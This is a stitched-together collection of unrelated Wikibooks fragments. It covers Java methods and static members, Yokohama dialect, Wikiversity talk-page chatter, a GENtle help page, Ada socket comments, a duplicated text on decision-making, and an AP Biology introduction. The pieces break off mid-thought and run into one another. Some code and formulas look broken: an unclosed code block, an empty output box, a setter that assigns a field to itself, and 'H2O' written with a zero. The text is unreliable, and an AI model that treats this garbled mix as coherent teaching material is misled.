      }
 
      public int getAge() {
          return age;
      }

      public void setName(String name) {
          name = name;
      }
 
      public String getName() {
          return name;
      }
  } // End of nested class definition

  /** Method using the nested class to return values */
  public ReturnObject getPersonInfoById(int id) {
    int    age;
    String name;
    ...
    // Get the name and age based on the ID from the database
    ...
    ReturnObject result = new ReturnObject();
    result.setAge(age);
    result.setName(name);

    return result;
  }
}
&lt;/syntaxhighlight&gt;}}

In the above example the &lt;code&gt;getPersonInfoById&lt;/code&gt; method returns an object reference that contains both values of the name and the age. See below how you may use that object:

{{XExample|1=&lt;span id=&quot;code-section-78&quot;&gt;'''Code section 3.78: Retrieving the values.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;2&quot;&gt;
MyObject object = new MyObject();
MyObject.ReturnObject person = object.getPersonInfoById(102);

'''Question 3.10''': Consider the following code:

{{XExample|1=&lt;span id=&quot;question-10&quot;&gt;'''Question 3.10: Compiler error.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot;&gt;
private int myMethod(int a, int b, String c) {
  if (a &gt; 0) {
    c = &quot;&quot;;
    return c;
  }
  int b = b + 2;
  return b;
}
&lt;/syntaxhighlight&gt;}}

The code above will return a compiler error. Why?
{{Java/Hidden begin|title=Answer}}
{{XExample|1=&lt;span id=&quot;answer-10&quot;&gt;Answer 3.10: Compiler error.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;1, 4&quot;&gt;
private int myMethod(int a, int b, String c) {
  if (a &gt; 0) {
    c = &quot;&quot;;
    return c;
  }
  int b = b + 2;
  return b;
}
&lt;/syntaxhighlight&gt;}}
The method is supposed to return a {{java:int}} but at line 4, it returns &lt;code&gt;c&lt;/code&gt;, which is a String.
{{Hidden end}}
{{Hidden end}}

== Special method, the constructor ==
The constructor is a special method called automatically when an object is created with the {{java:new}} keyword. Constructor does not have a return value and its name is the same as the class name. Each class must have a constructor. If we do not define one, the compiler will create a default so called '''empty constructor''' automatically.

{{XCode|1=&lt;span id=&quot;code-listing-13&quot;&gt;'''Code listing 3.13: Automatically created constructor.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;5-6&quot;&gt;
public class MyClass {
  /**
  * MyClass Empty Constructor
  */
  public MyClass() {
  }
}
&lt;/syntaxhighlight&gt;}}

== Static methods ==

A ''static method'' is a method that can be called without an object instance. It can be called on the class directly. For example, the &lt;code&gt;valueOf(String)&lt;/code&gt; method of the &lt;code&gt;Integer&lt;/code&gt; class is a static method:

{{XExample|1=&lt;span id=&quot;code-section-79&quot;&gt;'''Code section 3.79: Static method.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot;&gt;
Integer i = Integer.valueOf(&quot;10&quot;);
&lt;/syntaxhighlight&gt;}}

As a consequence, it cannot use the non-static methods of the class but it can use the static ones. The same way, it cannot use the non-static attributes of the class but it can use the static ones:

{{XExample|1=&lt;span id=&quot;code-section-80&quot;&gt;'''Code section 3.80: Static attribute.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot;&gt;
private static int count = 0;

public static int getNewInteger() {
  return count++;
}
&lt;/syntaxhighlight&gt;}}

You can notice that when you use &lt;code&gt;System.out.println()&lt;/code&gt;, &lt;code&gt;out&lt;/code&gt; is a static attribute of the &lt;code&gt;System&lt;/code&gt; class. A static attribute is related to a class, not to any object instance, so there is only one value for all the object instances. This attribute is unique in the whole Java Virtual Machine. All the object instances use the same attribute:
{| style=&quot;width: 100%;&quot;
|valign=&quot;top&quot;|{{XCode|1=&lt;span id=&quot;code-listing-14&quot;&gt;'''Code listing 3.14: A static attribute.'''&lt;/span&gt;
&lt;syntaxhighlight lang=&quot;Java5&quot; line start=&quot;1&quot; highlight=&quot;3&quot;&gt;
public class MyProgram {

    public static int count = 0;

    public static void main (String[] args) {
        MyProgram.count++;

        MyProgram program1 = new MyProgram();
        program1.count++;

        MyProgram program2 = new MyProgram();
        program2.count++;

        new MyProgram().count++;
        System.out.println(MyProgram.count);
    }
}
&lt;/syntaxhighlight&gt;}}
|valign=&quot;top&quot;|{{XConsole|1='''Output for Code listing 3.14'''
&lt;pre style=&quot;background-color:#000; color:#fff;&quot;&gt;

&lt;/pre&gt;}}

'''Question 3.11''': Visit the Oracle [http://docs.oracle.com/javase/7/docs/api/java/lang/Integer.html JavaDoc of the class &lt;code&gt;java.lang.Integer&lt;/code&gt;].

How many static fields does this class have?
{{Java/Hidden begin|title=Answer}}
4.
* &lt;code&gt;int MAX_VALUE&lt;/code&gt;,
* &lt;code&gt;int MIN_VALUE&lt;/code&gt;,
* &lt;code&gt;int SIZE&lt;/code&gt; and

      <text xml:space="preserve">Yokohama-ben may have started out in Yokohama but it is now spoken broadly across the southern Kanto area from the Shounan beaches south of Kamakura all the way up to Shibuya in south-western Tokyo. It is especially noticeable in young people between the ages of 10 to 25 or so.

Characteristics

1) The use of &quot;jan&quot; as a sentence terminating particle, spoken with a rising tone. It is used like the English sentence terminating particles &quot;right?&quot;, &quot;isn't it?&quot; It can also be spoken with a dropping tone, and the feeling is that the speaker is determined but still wants agreement.

2) The use of &quot;saa..&quot; between phrases and clauses as a kind of verbal equivalent of a comma.

3) Particularly with females, the use of highly raised and elongated tone on the continuative &quot;te&quot; particle on non-terminal verbs. E.g., Achi itte*, kare to hanishite*, sokode saa... moto no kareshi ga kitte saa....

The book of the month for '''April''' is '''[[US History]]'''.

'''[[US History]]''' covers the history of the United States of America from the pre-Columbian era to today, including 9/11, the Gulf wars, and terrorism. The chapters of the book follow the timeline from the early colonial period through the American revolution, the progressive era and the world wars, and an appendix covers all presidents, from George Washington to George Bush. The textbook is based on the College Entrance Examination Board test in Advanced Placement, United States History.

      <text xml:space="preserve">Hey everyone,

I'm '''The Humble Guy'''. :-)

For starters. I just wanna help out. Particularly in [[Wikiversity]]. When completed, it may become the most important wiki project ever made converging all the other wikis together and providing resources for Wikiversity. It is so important that I believe Wikiversity should have its own independent domain name. I have suggestions in my talk page so check it out.

Oh ya, I'm into Eco and Biz. Currently I'm trying to set up a league for the [[Wikiversity:Social Sciences |Schools of Social Sciences]]. A league may help in building some structure in the schools before any &quot;classes&quot; may actually take place. Wikiversity is understaffed you know. Pls. help if you can. Cheers!

Gosh, I'm sorry I've got to go now, I guess for good. I have a job now, and I believe its for the long term. Too bad I was not able to build the [[Wikiversity:School of Economics|School of Economics]] into what I wanted it to be. We lacked the books and the manpower. I hope at least I made a good enough start. I would just appeal to everyone, that as soon the books are made, please build WikiU. Thanks all!</text>

==Suggestions==

Hope the bosses read bout this...

*1. Darn upgrade Wiki to a revolutionary new version.
*2. There should be 3 kinds of login's with varying levels...
**'''Faculty''' (''Instructors'', ''Professors'', ''Chair'', ''Dean'')
**'''Student''' (based on merit and the courses finished)
**'''Builders''' (''Writers'', ''Contributors'', ''Admins'') 

The Faculty teach and the students learn based on what the Builders write and do ( basically all the stuff that wikipedians do). Faculty may be a builder, but a student can not be a builder, though students can write on a few designated pages for homework.

*3. Make a wikiversity.org, independent of Wikibooks.
*4. Check out real on-line universities as a guide. 


Hey there!  My name is Amish and I'm over at the [[Wikiversity:School of Literature and English Studies| SLES]] and you have some cool ideas above.  I have this terrible feeling some of the &quot;bosses&quot; have sort of given up on the Wikiversity idea.  Who knows.  I think you've got a great idea with the logins. [[User:Atrivedi| ~Amish]]

Hey. Thanks. We just have to keep on pushing. People will only come back if there will be lots of activity. And when there is activity, wikiversity can be sustained. Problem is, how do we invite more contributors? Like by the thousands. Also, do you know any admins? bosses? They should know that wikiversity is on life support! Some thing should be done! Oh ya, I borrowed your idea of making course titles, I hope you don't mind....[[User:Humble_Guy| Humble Guy]]

I agree.  We just have to keep at it.  I don't know any of the admin folks and the ones I've left notes for have never responded or said anything back to me, so I wonder if perhaps they don't care.  No problem with the course titles.  What school are you working on?  Good luck!  [[User:Atrivedi| ~Amish]]

I'm at the School of Economics, I have little support though....
....[[User:Humble_Guy| Humble Guy]]

I think if we can get some college clubs to add stuff we might be able to get alot more contributions.  College students have nothing better to do.  They have professional clubs for just about every engineering subject I know of.  We gotta get some of them invovled.

:Yes, more volunteers would be great. :-) --[[User:Humble Guy|Humble Guy]] 16:48, 27 May 2005 (UTC)

I started a fragment in the Accounting section. If I could just figure out a little of the formatting, I could add more.

== Your account will be renamed ==

&lt;div class=&quot;plainlinks mw-content-ltr&quot; lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;
Hello,

The developer team at Wikimedia is making some changes to how accounts work, as part of our on-going efforts to provide new and better tools for our users like cross-wiki notifications. These changes will mean you have the same account name everywhere. This will let us give you new features that will help you edit and discuss better, and allow more flexible user permissions for tools. One of the side-effects of this is that user accounts will now have to be unique across all 900 Wikimedia wikis. See [[m:Special:MyLanguage/Single User Login finalisation announcement|the announcement]] for more information.

Unfortunately, your account clashes with another account also called Humble Guy. To make sure that both of you can use all Wikimedia projects in future, we have reserved the name Humble Guy~enwikibooks that only you will have. If you like it, you don't have to do anything. If you do not like it, you can [[Special:GlobalRenameRequest|pick out a different name]].

Your account will still work as before, and you will be credited for all your edits made so far, but you will have to use the new account name when you log in.

Sorry for the inconvenience.

Yours,&lt;br /&gt;[[m:User:Keegan (WMF)|Keegan Peterzell]]&lt;br /&gt;Community Liaison, Wikimedia Foundation

This account has been renamed as part of [[m:Special:MyLanguage/Single User Login finalisation announcement|single-user login finalisation]]. If you own this account you can [[{{#special:userlogin}}|log in using your previous username and password]] for more information. If you do not like this account's new name, you can choose your own using this form after logging in: [[{{#special:GlobalRenameRequest}}]]. -- [[m:User:Keegan (WMF)|Keegan (WMF)]] ([[m:User talk:Keegan (WMF)|talk]])

The GENtle web interface lets you access DNA and amino acid sequences from [http://www.ncbi.com NCBI], as well as publications listed at [http://www.ncbi.nlm.nih.gov PubMed]. The interface also covers BLAST searches.

== NCBI ==
Chosing ''Nucleotide'' or ''Protein'', entering a sequence name/keywords, and hitting ''Search''/&lt;tt&gt;ENTER&lt;/tt&gt; will show the NCBI search results for that query. More results (if any) can be browsed with ''&gt;&gt;''.

Double-clicking an entry will download and open the (annotated) sequence.

== PubMed ==
The ''PubMed'' option gives new entry fields for author(s) (written &quot;Lastname Initials&quot;, separated by &quot;&lt;tt&gt;,&lt;/tt&gt;&quot;), and date limitations (years), as well as a result sort option.

Double-clicking an entry will open a web browser window with the respective PubMed abstract page.

== BLAST ==
Running a BLAST search for a DNA or amino acid sequence will open a new tab in the web interface, showing a countdown for the time the BLAST results are expected to arrive. Once loaded, the results are displayed as simple alignments.

Double-clicking an entry will open the found sequence.</text>

package GNAT.Sockets is

   --  Sockets are designed to provide a consistent communication facility

   --  similar to that proposed as part of the BSD socket layer. This is a

   --  C select() waits for a number of file descriptors to change
   --  status. Usually, three independent sets of descriptors are
   --  watched (read, write and exception). A timeout gives an upper
   --  bound on the amount of time elapsed before select returns.
   --  This function blocks until an event occurs. On some platforms,
   --  C select can block the full process.

   --  Check_Selector provides the very same behaviour. The only
   --  difference is that it does not watch for exception events. Note
   --  that on some platforms it is kept process blocking in purpose.
   --  The timeout parameter allows the user to have the behaviour he
   --  wants. Abort_Selector allows to abort safely a Check_Selector
   --  that is blocked forever. A special file descriptor is opened by
   --  Create_Selector and included in each call to
   --  Check_Selector. Abort_Selector causes an event to occur on this
   --  descriptor in order to unblock Check_Selector. The user must
   --  call Close_Selector to discard this special file. A reason to

== Decisions ==

What is a decision? Merriam- Webster’s dictionary defines a word as a noun, with meaning “a position arrived at after consideration.” 

Mallach, defines a decision as a reasoned choice among alternatives. Examples of this are:
*Where to advertise a new product,
*What stock to buy,
*What movie to see,
*Where to go for dinner.

Some other authors define the term in similar manner, but with more obvious mathematical approach to definition (Zvi Covaliu, 2001, A Fair Isaak White Paper). For Covaliu, a decision, refers to a point in time when the decision maker has to choose one alternative, out of a domain of available alternatives, that could be discrete or continuous, simple or combined. An alternative can be a combination of values to be chosen at the decision point for a number of decision variables.

== Different Decisions ==

What separates one decision from another is the difference in the information set available to the decision maker before each decision is made. The information set corresponding to a decision is the set of all observations available to the decision maker prior to making that decision. 

Hammond, Kenney and Raiffa equate the decision with, what they call, “smart choice.” According to them, every “smart choice” can be broken down to eight elements:

*Problem
*Objectives
*Alternatives
*Consequences
*Trade-Offs
*Uncertainty
*Risk Tolerance
*Linked Decisions  

First five of these elements are applicable to virtually any decision. Last three- uncertainty, risk tolerance and linked decisions- help clarify decisions in volatile or evolving environments. Some decisions won’t involve these elements, but many most important decisions will. 

Mallach, on the other hand defines decision elements in different terms. For him, the decision comprises of three elements: 

*Decision Statement- What are we trying to decide?
*Alternative- What are the options?
*Decision Criteria- How are we going to judge the merits of each alternative?

Further, the decision can be classified in three types, based on the type of structure or nature of the task: 

*Structured Problems
**Routine and repetitive with standard solution
**Well defined decision making procedure
**Given a well-defined set of input, a well defined set of output is defined
*Semi-structured Problems
**Has some structured aspect
**Some of the inputs or outputs or procedures are not well defined
*Unstructured Problems
**All phases of decision making process are unstructured

Simon, on the other hand, classifies decisions into two categories: 			
*Programmed decisions, and
*Non-programmed decisions. 

The programmed decision is repetitive and routine. The non-programmed decisions are novel, unstructured, and call for intelligent adaptive and problem oriented action when solving the problem. Simon states that the traditional techniques for these non-programmed decisions are judgment, creativity, and intuition.

C.I. Barnard categorizes decisions into logical and non-logical. Logical decision making involves conscious thinking and reasoning, and the process is expressible in words or other symbols. Non-logical decision making is not capable of being expressed in words, or as reasoning, and is made known only by the action itself.

The decisions are made in order to solve a particular problem. According to Duncker (1945) solving a problem means continuous narrowing of the range of options through modifications of representations. This repetitive process may continue until there may be only one alternative left to consider. Hence, it is not so strange to see “decision-making” and “problem solving” used interchangeably in common language and discussion. 
As stated in the paragraph above, decision has to be reached; it has to be made through a deliberate process of decision-making.  As such, once the term is used, certain action is expected on behalf of the agent that makes a decision (decision-maker). According to Simon, the decision-making process consists of three main stages: 

#Intelligence:  Fact finding, problem and opportunity sensing, analysis, and exploration. 
#Design:  Formulation of solutions, generation of alternatives, modeling and simulation. 
#Choice:  Goal maximization, alternative selection, decision making, and implementation. 

Other authors also consider the implementation to be integral element of the decision-making process, building upon Simon’s observations.

For Hammond et al, in order to make the right decision, one must: 

#work on the right decision problem
#specify the objectives
#create imaginative alternatives
#understand the consequences
#grapple with trade-offs
#clarify the uncertainties
#think hard about risk tolerance
#consider linked decisions


Decision making can be divided into 3 types: strategic, management control and operations control. Within each of these levels, decision making can be classified as either structured or unstructured, closely paralleling the Simon’s classification of the decision (i.e. structured decision making uses programmed decisions). 

Decisions are difficult. There are four key areas that determine the relative difficulty of a decision:
*Structure – in general, the more structure, the less information required
*Cognitive limitations – the human mind is limited to handling 5 to 9 distinct pieces of information
*Uncertainty – the amount is based on how complete and accuracy of the information 
*Alternatives and multiple objectives – the selection of one alternative may impede the progress towards a different goal


There are two traditional models of decision making:
#The rational man model is associated with economics. The rational decision-maker systematically searches for the decision that will maximize results. Goal is to optimize or maximize.
*Know the goals, know the goal that optimizes.
*Know all the alternative courses of action.
*Know the relation of courses of action to goals, this is you can predict consequences of actions, i.e. can predict outcomes of actions.
#Alternative model called the administrative model associated with Herbert Simon. Simon says the rational man model is prescriptive or normative, the way it is supposed to be, rather than the way it is. 
Simon famously discussed limits on decision making. According to him, there are two limits:
# Bounded rationality: decision-maker receives imperfect information about goals and courses of action and relation of means to ends. Decision-making is then based on these restrictions.  
# Bounded discretion: constraints on optimizing, prior commitments, moral and ethical standards, laws, and social standards.
Influenced by these limitations, decision makers are often forced to make decisions that are just good enough. This is what Simon referred to as “satisficing.”</text>

Mallach, defines a decision as a reasoned choice among alternatives. Examples of this are:
•	Where to advertise a new product,
•	What stock to buy,
•	What movie to see,
•	Where to go for dinner.

J. F. Yates defines the term in his book “Decision management: How to Assure Better Decisions in Your Company “ in a following way: A decision is a commitment to an action that is intended to yield satisfying states of affairs for particular parties, called the beneficiaries of that action.

Some other authors define the term with more obvious mathematical approach to this issue (Zvi Covaliu, 2001, A Fair Isaac White Paper). For Covaliu, a decision refers to a point in time when the decision maker has to choose one alternative, out of a domain of available alternatives that could be discrete or continuous, simple or combined. An alternative can be a combination of values to be chosen at the decision point for a number of decision variables.

What separates one decision from another is the difference in the information set available to the decision maker before each decision is made. The information set corresponding to a decision is the set of all observations available to the decision maker prior to making that decision. 

Further, the decision can be classified in three types, based on the type of structure or nature of the task: 

1.	Structured Problems
•	Routine and repetitive with standard solution
•	Well defined decision making procedure
•	Given a well-defined set of input, a well defined set of output is defined

2.	Semi-structured Problems
•	Has some structured aspect
•	Some of the inputs or outputs or procedures are not well defined

3.	Unstructured Problems
•	All phases of decision making process are unstructured

Simon, on the other hand, classifies decisions into two categories: 			
•	Programmed decisions, and
•	Non-programmed decisions. 

The programmed decision is repetitive and routine. The non-programmed decisions are novel, unstructured, and call for intelligent adaptive and problem oriented action when solving the problem. Simon states that the traditional techniques for these non-programmed decisions are judgment, creativity, and intuition.

Non-logical decision making is not capable of being expressed in words, or as reasoning, and is made known only by the action itself. 

There are four types of decisions according to F. Yeats:

•	Type 1: choice decisions. In choice decisions, the decider is faced with two or more discrete, specified alternatives and must choose a subset from that pool, perhaps just one of those options. A site example: “So does the new plant go to Amsterdam or to Bonn?” When most people think about what qualifies as a decision, choices are what come to mind immediately.

•	Type 2: accept/reject decisions. In accept/reject decisions, the decider is presented with one option only and must either take it or leave it. An investment illustration: “Should we replace the Number 5 press?” A proposal example: “Does this acquisition of Leung Services make sense for us?” Accept/reject decisions are a special case of choice decisions in that the decider actually has two options, taking the offered alternative or refusing to do so.

•	Type 3:  evaluation decisions. In evaluation decisions, the decider must commit to a course of action based on an assessment of the worth of some entity, that is, on an evaluation. A bidding example: “Should we, as our analysis says, submit a quote of $35 million on that highway rehabilitation project?” A performance appraisal illustration: “Should I give Marie an 8 out of 10 this year?”

•	Type 4:  construction decisions. In construction decisions, the decider must use available resources to try to assemble the ideal alternative, subject to particular constraints. A budgeting illustration: “Our total available funds come to $50 million. The proposed budget for sales is $7 million, for manufacturing $22 million, [and so on]. Is this the budget we should approve?” A negotiations example: “Here’s where we are. . . . Have we finally come up with a package that both sides can live with?”

Decisions are difficult. There are four key areas that determine the relative difficulty of a decision:
•	Structure – in general, the more structure, the less information required
•	Cognitive limitations – the human mind is limited to handling 5 to 9 distinct pieces of information

There some other explanations of the term” decision structure.” In the graphics below, taken from course presentation of Peter Waiganjo Wagacha from the Institute of Computer Science on University of Nairobi, which has been adapted from Dr. Stan Kurkovsky based on the course text: Decision Support Systems and Intelligent System, decision structure is explained in terms of collaborative and non-collaborative decisions.

      <text xml:space="preserve">== Big selective merger proposal. ==

I'm of the opinion that we need to merge a lot of the disparate biological knowledge around wikibooks into the book [[General Biology]]. This is a controversial merge (and I know it!) and that's exactly why I'm posting this here. If you have any objections, write them now or forever hold your peace. Let me clarify what I think must be done. This is not an immediate issue - it does not need to be done ''now'' or anything. This is pie-in-the-sky. Just a plan we should probably fully implement at some point in time.

=== The plan ===

I am going to be merging all the basic biological knowledge of books that aim to roughly teach a college's ''first semester'' course of Biology. Some synonyms for the basic course of biology offered in a college: &quot;Biology A, Biology I, Biological Principles, Intro to Biology&quot; etc... These are the books I will be merging much of their non-exclusive biological knowledge into [[General Biology]]:

#[[AP Biology]]
#[[A-level Biology]]

Both the AP-test and the AQA Biology level 1 test aim to test for similar biological knowledge - that which is taught in the first semester course of biology. These tests have different parts of the knowledge they focus on, and I agree that aid on the tests' focus should be maintained in their respective books, but there is no need to try to cover first semester biology in three separate books.

=== Why and How ===

Both of those topics share and rely on very much the same materials covered in the General Biology textbook. There are certain aspects of the subject that cannot and should not be covered in a General Biology book (such as what the AP test is most likely to test on), and that information should remain in those books. However, the general biological knowledge - such as how cells divide and the different organelles - should be kept, for now, in one place. 

We should consolidate knowledge that is choppily spread out. Know If we do we will have one high-quality version of information in a single, referential place rather than a few disparate, okay stubs about the subject. An example of a book that does ''not'' need consolidation is [[Biology, Answering the Big Questions of Life]]. The information in that stands on its own legs as high quality, and is well fit to its specific purpose - we may see fit to copy information from that book, but there is no need to remove the writing from there, as the writing is doing fine there. However, here is an example of [[AP_Biology/Membranes|a lack of information]] that would benefit from just linking to the general biology textbook and emphasizing the most important points to learn. -[[User:Monk|&lt;font color=&quot;green&quot;&gt;Monk&lt;/font&gt;]]&lt;sub&gt;[[User talk:Monk|talk]]&lt;/sub&gt; 05:14, 18 February 2007 (UTC)

===Discussion===
Please comment on this proposal below. Voting (&quot;for&quot;/&quot;against&quot;) is welcomed.

==Full bio textbook==
I believe the the wiki community should invest the time to create a full-fledge Biology textbook (similar to that of the US History).  In other words, it should be a simplified version of what we have now.  Many parts of biology are not listed in the links and I think we could simplify the navigation if we have one book to encompass everything.  If someone knows a lot about a specific topic, then go right ahead and write a wikibook about it and add a link to it at the bottom of one of the biology book's chapters.

== Locked ==

Why is this locked for Unregistered users,  It seems like they might be those most likely to recommend a book be made.[[User:Dolive35|Dolive35]] 18:30, 27 June 2006 (UTC)</text>

===Welcome!===
This textbook is based on the College Entrance Examination Board test in Advanced Placement Biology. This seems to be the best reference to build a textbook on, since it is a standard on the subject and covers what most Biology students study in high school and college. Overall, however, the content and structure may in time vary from all other books. Besides the regular Wikibook rules governing unbiased writing, the only other guideline should be that everything should be kept divided into logical chapters. Everything else is left pretty much to the individual authors that elect to join the project.
Enjoy!

AP Course Description ([http://www.collegeboard.com/student/testing/ap/sub_bio.html view the .pdf])

There are already Biology Wikibooks.  This is a Wikibook geared towards high school students ''preparing'' for the College Board's AP Examination.  It assumes readers have a general background to biology, as students planning to take the exam are generally enrolled in an AP Biology course, and the AP curriculum is a second-year biology course.

Other Wikibooks: [[Biology]], [[FHSST Biology]] &lt;small&gt;- just the framework&lt;/small&gt;

===&quot;How long should it take to study this Wikibook?&quot;===

Good question. We'll let you know when we finish.

===The AP Biology Test===

The AP Biology Test is a three hour exam.  It consists of 100 multiple-choice question (60% of the grade), and four free response questions (40% of the grade).  Eighty minutes are alloted for the multiple-choice section and 100 minutes (including a 10 minute reading period) for writing the four essays.  The contents of the exam are approximately as follows:
* Molecules and Cells, 25%
* Heredity and Evolution, 25%
* Organisms and Populations, 50%

Essay I pertains to &quot;Molecules and Cells&quot;.  Essay II tests knowledge of &quot;Heredity and Evolution&quot;.  Essays III and IV examine students knowledge of &quot;Organisms and Populations&quot;.  One of the four essays deals strictly with one of the 12 AP national labs.

The multiple-choice section awards one point for a correct answer, zero points for answers left blank, and subtracts &lt;sup&gt;1&lt;/sup&gt;/&lt;sub&gt;4&lt;/sub&gt; of a point for wrong answers as a means to deter random guessing.

The exam is based so that the average student will score at 50% of the maximum.

'''Hints for the Free Response Section'''

Study the 12 labs and memorize the keywords associated with each lab, trying to get at least a generalized picture of what the lab is about.  Those that grade the essays '''do not''' evaluate organization, length, or style.  They '''do''' look for keywords and concepts, assigning points based on a rubric with a list of keywords and concepts associated with the question.  During the 10 minute planning period, it is prudent to jot down keywords on the green outline you'll be given so you won't forget and exclude them from the essay.

'''Hints for the Multiple-Choice Section'''

The key to cracking the multiple-choice section of the test is P.O.E.

P.O.E. = Process Of Elimination

There are five choices for each question, and a small penalty for guessing.  When you've eliminated two answers, guess.  If you cannot eliminate two answers, leave the question blank and come back later if you have time.  You are allowed to mark in your examination booklet, and physically crossing off wrong answers, circling correct ones, and circling numbers that you wish to re-examine is a good idea.  Some students will skip a question, fill in the wrong oval for the next, and must waste time trying to redetermine where the mistake was made.  Marking in your examine booklet will prevent this headache. 

''Good Luck!''

==What is Biology?==
''Biology'' is the study of living things, literally the science of life.  Though there is disagreement, five characteristics that usually define life are:
# '''Order''' - All organisms are cellular, with one or more, and are highly structured.  Atoms create organic molecules, which combine into macromolecules, which construct cellular organelles, and so on.  There is a rising hierarchy of order to life.  Cells form tissues, which make up organs, which are part of organ systems, which work together to form a complex organism.
# '''Sensitivity''' - Organisms respond to their environment, or stimuli.
# '''Growth, development, and reproduction''' - The ability to grow and reproduce are fundamental traits inherent to all organisms.  Organisms also possess hereditary molecules (usually DNA) that are passed to offspring.  
# '''Regulation''' - Regulatory mechanisms coordinate an organism's internal functions, including food intake, waste disposal, and many more.
# '''Homeostasis''' - All organisms are capable of maintaining relatively constant internal conditions, different from their environment.  The ability to maintain this internal balance is called homeostasis.

==Scientific Reasoning==

Science is a methodology for learning about the world.  The scientific method deals with systematic investigation, reproducible results, the formation and testing of hypotheses, and reasoning.  Reasoning can be broken down into two categories: induction and deduction. Most reasoning in science is done through induction.

===Inductive Reasoning===

''Definition:'' Determining a '''general statement''' from '''several facts'''. (Not always accurate)&lt;br&gt;
''Example:'' We have had a test every Tuesday for the past three months; therefore, we will have a test next Tuesday (and all Tuesdays).

===Deductive Reasoning===

''Definition:'' Determining a '''single fact''' from a '''general statement'''. (Only as accurate as the statement)&lt;br&gt;
''Example:'' The teacher said she checks homework every Monday; therefore she will check homework on next Monday.

==The Scientific Method==

The scientific method is not a step by step, linear process.  It is an intuitive process, a methodology for learning about the world through the application of knowledge.  Scientists must be able to have an &quot;imaginative preconception&quot; of what the truth is.  Scientists will often observe and then hypothesize the reason why a phenomenon occurred.  They use all of their knowledge and a bit of imagination, all in an attempt to uncover something that might be true.    A typical scientific investigation might go like so:

{| style=&quot;background:#efefef;&quot;
|You ''observe'' that a room appears dark, and you ponder ''why'' the room is dark.  In an attempt to find explanations to this curiosity, your mind unravels several different ''hypotheses''.  One hypothesis might state that the lights are turned off.  Another hunch might be that the room's light bulb has burnt out.  Worst yet, you could be going blind.  To discover the truth, you ''experiment''.  You feel your way around the room and find a light switch and turn it on.  No light.  You ''repeat'' the experiment, flicking the switch back and forth.  Still, nothing happens.  Your initial hypothesis (the room is dark because the lights are off) has been ''rejected''.  You devise more experiments to test your hypotheses, utilizing a flashlight to prove that you are indeed not blind.  In order to ''accept'' your last remaining hypothesis as the truth,  you ''predict'' that changing the light bulb will fix the problem.  It does.  Another prediction you could make is that the light will not work in another socket because it is burnt out.  This is easily testable.  If ''all'' of your predictions succeed, the original hypothesis is considered valid and is accepted, usually after repetitive testing.  In some cases, however, your predictions will not be correct, and you'll have to start over.  You can see how there can never really be a degree of absolute certainty, but if the bulb does not work in all sockets and replacing it fixes the original problem, we can be reasonably certain that the bulb was burnt out.

[[File:Ap_biology_scienceofbiology01.jpg|thumbnail|right|250px|'''How Science is Done'''&lt;br&gt;&lt;small&gt;A diagram that illustrates scientific investigation&lt;/small&gt;]]

The general process is summed up by this diagram.  Scientists first make observations that raise a particular question.  In order to explain the observed phenomenon, they develop a number of possible explanations, or hypotheses.  This is the inductive part of science, observing and constructing plausible arguments for why an event occurred.  Experiments are then used to eliminate one of more of the possible hypotheses until there one hypothesis remains.  Using deduction, scientists use the principles of their hypothesis to make predictions, and then test to make sure that their predictions are confirmed.  After many trials (repeatability) and all predictions have been confirmed, the hypothesis then may become a theory.

&lt;span id=&quot;QuickDef&quot;&gt;&lt;/span&gt;'''Quick Definitions'''

:'''Observation''' - quantitative and qualitative measurements of a particular phenomenon.
:'''Inference''' - deriving new knowledge based upon old knowledge.
:'''Hypotheses''' - a suggested explanation.
:'''Rejected Hypothesis''' - an explanation that has been ruled out through experimentation.
:'''Accepted Hypothesis''' - an explanation that has not been ruled out through excessive experimentation and makes verifiable predictions that are true.
:'''Experiment''' - A test that is used to rule out a hypothesis or validate something already known.
:'''Scientific Method''' - The process of scientific investigation.
:'''Theory''' - A widely accepted hypothesis that stands the test of time.  It has withstood many attempts at falsification.

==Bioethics==

As our ability to manipulate life in profound ways has increased with the advent of technologies like genetic modification, pharmacology, and cloning, we as a species have taken upon ourselves the obligation to be responsible with our power. Given our understanding of the processes that allow life to exist, we must use our knowledge to advance humanity.  The study of this responsibility is called bioethics.

==Subatomic Particles==
Subatomic particles are the particles that make up atoms: protons, neutrons, and electrons. Protons and neutrons cluster in a dense core called the nucleus, while electrons orbit the nucleus in shells. The number of protons in a nucleus determines the name of the atom: one proton is hydrogen, two is helium, etc. See the periodic table for a full listing of all the atoms.

==Molecules==

Molecules are groupings of atoms that bond together to form one building block of a substance. For example, water is H2O. A single molecules of H2O would be 2 hydrogen atoms and a lone oxygen atom.

Molecules are held together by three different bonds: ionic, polar covalent, and nonpolar covalent. An  ionic bond is a bond between a metal and a non-metal. Generally the metal takes electrons from the non-metal, creating a very strong bond. A polar covalent bond is between two non-metals. A covalent bond is formed when valence electrons (electrons in the outer shell) are shared between the two atoms. Each atom wants to have eight valence electrons, and achieves this by sharing electrons and forming bonds. A polar covalent bond is when the electrons are shared unequally, because one of the atoms has a higher electronegativity (pull on electrons). A nonpolar covalent bond has electrons shared equally.

(Needs info on polar and nonpolar molecules, also on isomers, enantiomers, etc.)

==Compounds==

ionic bonds
covalent (polar/nonpolar) bonds
isomers
polymers

==Reactions==
Any process in which chemicals change properties or identities (i.e. transform into other substances) is called a &lt;i&gt;reaction&lt;/i&gt;.  The substances that participate (enter) in a reaction are called the reactants; substances that form once the reactants react are called the products. For instance, consider the production of water (H&lt;sub&gt;2&lt;/sub&gt;O):

&lt;center&gt;&lt;math&gt;2\hbox{H}_{2(g)} + \hbox{0}_{2(g)} \to 2\hbox{H}_2\hbox{0}_{(l)}&lt;/math&gt;&lt;/center&gt;

The reaction dictates that for every two parts hydrogen (H&lt;sub&gt;2&lt;/sub&gt;) and one part oxygen(O&lt;sub&gt;2&lt;/sub&gt;) reacting together, two parts water will form as a product.

=== Energy in Reactions ===
